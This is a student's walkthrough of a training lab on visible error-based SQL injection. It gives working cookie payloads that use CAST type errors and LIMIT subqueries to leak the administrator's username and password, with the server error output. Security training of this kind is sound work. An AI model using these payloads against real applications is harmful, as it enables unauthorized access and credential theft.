## Lab 13 - Visible error-based SQL injection

**SQL Injection at** - TrackingId Cookie  
**End Goal** - Find password for the administrator user.

---
### Analysis:  
  
- TrackingId=xyz`'` shows us this on the screen.
```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'uDRijv2yceveaq7b''. Expected  char
```
-> The error message is shown in detail. This discloses the full SQL query, including the value of your cookie. It also explains that we have an unclosed string literal.  
-> And TrackingId=xyz`'--` again removes the error message because it comments out that extra single quote at the end that we can se from the error msg shown above.


- TrackingId=xyz`' AND CAST((SELECT 1) AS int)--`  
-> Error Shown by this is :-  
```
ERROR: argument of AND must be type boolean, not type integer
  Position: 63
```

- So we do this TrackingId=xyz`' AND CAST((SELECT 1) AS int)=1--`  
-> now we don't get any error.

Now we Try to get the username from the table.


- TrackingId=uDRijv2yceveaq7b`' AND CAST((SELECT username FROM users) AS int)=1--`
```
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'uDRijv2yceveaq7b' AND CAST((SELECT username FROM users) AS i'. Expected  char
```
-> query now appears to be truncated due to a character limit. see that it only wrote i insted of int at the end.  


- TrackingId=`' AND CAST((SELECT username FROM users) AS int)=1--`  
-> we remove the part of the TrackingId so we get more free space, now we get this error message.  
```
ERROR: more than one row returned by a subquery used as an expression
```
-> more than 1 row is being returned, so we need to limit it to return 1 row.  


- TrackingId=`' AND CAST((SELECT username FROM users LIMIT 1) AS int)=1--`  
```
ERROR: invalid input syntax for type integer: "administrator"
```
-> Here it gave the usrename "administrator" because it is the first user in the table, so now we'll try to get password for that user.  
  
- TrackingId=`' AND CAST((SELECT password FROM users LIMIT 1) AS int)=1--`  
```
ERROR: invalid input syntax for type integer: "42omzh58utf1t5d6q1vo"
```  
-> This is the first password in the column, and the first username was administrator, so this is the password for administrator.  

- Login as the administrator user using the password.